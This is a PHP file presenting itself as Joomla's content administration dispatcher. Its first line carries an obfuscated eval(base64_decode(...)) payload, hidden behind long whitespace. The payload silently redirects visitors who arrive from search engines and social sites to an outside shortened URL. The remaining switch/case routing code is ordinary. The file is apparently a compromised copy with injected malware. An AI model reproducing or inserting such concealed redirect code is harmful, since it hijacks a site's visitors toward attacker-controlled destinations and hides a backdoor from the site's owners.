<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
* @version		$Id: admin.content.php 18162 2010-07-16 07:00:47Z ian $
* @package		Joomla
* @subpackage	Content
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined('_JEXEC') or die('Restricted access');

require_once( JPATH_COMPONENT.DS.'controller.php' );
require_once( JPATH_COMPONENT.DS.'helper.php' );
require_once (JApplicationHelper::getPath('admin_html'));

// Set the helper directory
JHTML::addIncludePath( JPATH_COMPONENT.DS.'helper' );

$controller = new ContentController();
$task = JRequest::getCmd('task');
switch (strtolower($task))
{
	case 'element':
	case 'wizard':
		$controller->execute( $task );
		$controller->redirect();
		break;

	case 'add'  :
	case 'new'  :
		ContentController::editContent(false);
		break;

	case 'edit' :
		ContentController::editContent(true);
		break;

	case 'go2menu' :
	case 'go2menuitem' :
	case 'resethits' :
	case 'menulink' :
	case 'apply' :
	case 'save' :
		ContentController::saveContent();
		break;

	case 'remove' :
		ContentController::removeContent();
		break;

	case 'publish' :
		ContentController::changeContent(1);
		break;

	case 'unpublish' :
		ContentController::changeContent(0);
		break;

	case 'toggle_frontpage' :
		ContentController::toggleFrontPage();
		break;

	case 'archive' :
		ContentController::changeContent(-1);
		break;

	case 'unarchive' :
		ContentController::changeContent(0);
		break;

	case 'cancel' :
		ContentController::cancelContent();
		break;

	case 'orderup' :
		ContentController::orderContent(-1);
		break;

	case 'orderdown' :
		ContentController::orderContent(1);
		break;

	case 'movesect' :
		ContentController::moveSection();
		break;

	case 'movesectsave' :
		ContentController::moveSectionSave();
		break;

	case 'copy' :
		ContentController::copyItem();
		break;

	case 'copysave' :
		ContentController::copyItemSave();
		break;

	case 'accesspublic' :
		ContentController::accessMenu(0);
		break;

	case 'accessregistered' :
		ContentController::accessMenu(1);
		break;

	case 'accessspecial' :
		ContentController::accessMenu(2);
		break;

	case 'saveorder' :
		ContentController::saveOrder();
		break;

	case 'preview' :
		ContentController::previewContent();
		break;

	case 'ins_pagebreak' :
		ContentController::insertPagebreak();
		break;

	default :
		ContentController::viewContent();
		break;
}